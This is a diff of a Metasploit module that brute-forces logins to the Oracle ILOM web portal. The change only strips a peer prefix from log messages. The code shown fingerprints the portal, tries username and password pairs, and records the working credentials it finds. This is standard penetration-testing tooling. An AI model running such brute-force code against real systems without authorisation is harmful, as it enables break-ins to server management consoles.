@@ -39,7 +39,7 @@ class Metasploit3 < Msf::Auxiliary
       return
     end
 
-    print_status("#{peer} - Starting login brute force...")
+    print_status("Starting login brute force...")
     each_user_pass do |user, pass|
       do_login(user, pass)
     end
@@ -57,15 +57,15 @@ class Metasploit3 < Msf::Auxiliary
         'method'    => 'GET'
       })
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
-      vprint_error("#{peer} - HTTP Connection Failed...")
+      vprint_error("HTTP Connection Failed...")
       return false
     end
 
     if (res and res.code == 200 and res.headers['Server'].include?("Oracle-ILOM-Web-Server") and res.body.include?("Integrated Lights Out Manager"))
-      vprint_good("#{peer} - Running Oracle Integrated Lights Out Manager portal...")
+      vprint_good("Running Oracle Integrated Lights Out Manager portal...")
       return true
     else
-      vprint_error("#{peer} - Application is not Oracle ILOM. Module will not continue.")
+      vprint_error("Application is not Oracle ILOM. Module will not continue.")
       return false
     end
   end
@@ -102,7 +102,7 @@ class Metasploit3 < Msf::Auxiliary
   #
 
   def do_login(user, pass)
-    vprint_status("#{peer} - Trying username:#{user.inspect} with password:#{pass.inspect}")
+    vprint_status("Trying username:#{user.inspect} with password:#{pass.inspect}")
     begin
       res = send_request_cgi(
       {
@@ -117,12 +117,12 @@ class Metasploit3 < Msf::Auxiliary
           }
       })
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
-      vprint_error("#{peer} - HTTP Connection Failed...")
+      vprint_error("HTTP Connection Failed...")
       return :abort
     end
 
     if (res and res.code == 200 and res.body.include?("/iPages/suntab.asp") and res.body.include?("SetWebSessionString"))
-      print_good("#{peer} - SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")
+      print_good("SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")
       report_cred(
         ip: rhost,
         port: rport,
@@ -133,7 +133,7 @@ class Metasploit3 < Msf::Auxiliary
       )
       return :next_user
     else
-      vprint_error("#{peer} - FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
+      vprint_error("FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
     end
 
   end
